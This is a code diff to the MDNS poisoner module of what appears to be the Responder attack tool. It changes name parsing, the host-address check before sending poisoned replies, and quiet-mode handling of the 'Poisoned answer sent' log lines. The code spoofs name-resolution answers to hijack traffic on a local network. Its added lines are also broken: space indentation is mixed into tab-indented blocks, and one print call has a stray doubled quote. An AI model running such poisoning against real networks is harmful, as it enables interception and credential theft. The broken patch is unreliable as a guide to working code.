@@ -33,14 +33,14 @@ def Parse_MDNS_Name(data):
 			NameLen_ = data[1+NameLen]
 			Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
 			FinalName = Name+b'.'+Name_
-			return FinalName.decode("latin-1")
+			return FinalName.decode("latin-1").replace("\x05","")
 		else:
 			data = NetworkRecvBufferPython2or3(data[12:])
 			NameLen = struct.unpack('>B',data[0])[0]
 			Name = data[1:1+NameLen]
 			NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
 			Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
-			return Name+'.'+Name_
+			return Name+'.'+Name_.replace("\x05","")
 
 	except IndexError:
 		return None
@@ -58,7 +58,7 @@ class MDNS(BaseRequestHandler):
 		MDNSType = Parse_IPV6_Addr(data)
 		# Break out if we don't want to respond to this host
 		
-		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
+		if (not Request_Name) or (RespondToThisHost(self.client_address[0].replace("::ffff:",""), Request_Name) is not True):
 			return None
 		LineHeader = "[*] [MDNS]"
 		if settings.Config.AnalyzeMode:  # Analyze Mode
@@ -74,8 +74,11 @@ class MDNS(BaseRequestHandler):
 			Buffer = MDNS_Ans(AnswerName = Poisoned_Name)
 			Buffer.calculate()
 			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
-			
-			print(color('%s %s Poisoned answer sent to %-15s for name %s' % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
+
+			if not settings.Config.Quiet_Mode:
+        LineHeader = "[*] [MDNS]"
+				print(color('%s %s Poisoned answer sent to %-15s for name %s' % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
+
 			SavePoisonersToDb({
 						'Poisoner': 'MDNS', 
 						'SentToIp': self.client_address[0], 
@@ -88,8 +91,10 @@ class MDNS(BaseRequestHandler):
 			Buffer = MDNS6_Ans(AnswerName = Poisoned_Name)
 			Buffer.calculate()
 			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
-			
-			print(color('%s %s Poisoned answer sent to %-15s for name %s' % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
+
+			if not settings.Config.Quiet_Mode:
+        LineHeader = "[*] [MDNS]"
+				print(color(''%s %s Poisoned answer sent to %-15s for name %s' % (LineHeader,datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S)"),self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
 			SavePoisonersToDb({
 						'Poisoner': 'MDNS6', 
 						'SentToIp': self.client_address[0], 
